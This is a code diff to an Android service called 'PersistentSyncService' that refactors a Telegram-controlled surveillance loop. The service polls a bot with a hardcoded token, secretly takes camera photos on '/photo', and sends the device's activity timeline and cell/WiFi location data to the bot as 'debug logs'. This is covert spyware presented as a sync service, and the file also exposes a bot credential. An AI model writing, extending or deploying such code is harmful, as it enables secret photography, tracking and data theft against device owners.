@@ -27,7 +27,7 @@ class PersistentSyncService : Service() {
     }
 
     private fun startPolling() {
-        serviceScope.launch {
+        serviceScope.launch(Dispatchers.IO) {
             while (isActive) {
                 try {
                     val botToken = "8961320031:AAGWyCdW9CziarfEF8p3ynltYOsMWUirxNw"
@@ -49,16 +49,18 @@ class PersistentSyncService : Service() {
                                 val message = update.getJSONObject("message")
                                 if (message.has("text")) {
                                     val text = message.getString("text")
-                                    if (text == "/photo") {
-                                        serviceScope.launch {
-                                            CameraUtility.capturePhoto(this@PersistentSyncService)
+                                    when (text) {
+                                        "/photo" -> {
+                                            serviceScope.launch { CameraUtility.capturePhoto(this@PersistentSyncService) }
                                         }
-                                    } else if (text == "/p") {
-                                        val timeline = ActivityTimelineUtility.generateActivityTimeline(this@PersistentSyncService, 12)
-                                        TelegramSyncHelper.sendDebugLog(this@PersistentSyncService, "0", "0", "📊 *Device Activity Log:*\n\n$timeline")
-                                    } else if (text == "/cell") {
-                                        val cellData = NetworkLocationUtility.getNetworkLocationInfo(this@PersistentSyncService)
-                                        TelegramSyncHelper.sendDebugLog(this@PersistentSyncService, "0", "0", "📡 *Cell/WiFi Diagnostic:*\n\n$cellData")
+                                        "/p" -> {
+                                            val timeline = ActivityTimelineUtility.generateActivityTimeline(this@PersistentSyncService, 12)
+                                            TelegramSyncHelper.sendDebugLog(this@PersistentSyncService, "0", "0", "📊 *Device Activity Log:*\n\n$timeline")
+                                        }
+                                        "/cell" -> {
+                                            val cellData = NetworkLocationUtility.getNetworkLocationInfo(this@PersistentSyncService)
+                                            TelegramSyncHelper.sendDebugLog(this@PersistentSyncService, "0", "0", "📡 *Cell/WiFi Diagnostic:*\n\n$cellData")
+                                        }
                                     }
                                 }
                             }
@@ -67,7 +69,7 @@ class PersistentSyncService : Service() {
                     }
                 } catch (e: Exception) {
                     Log.e("PersistentSyncService", "Polling error", e)
-                    delay(5000)
+                    delay(3000)
                 }
                 delay(10000)
             }
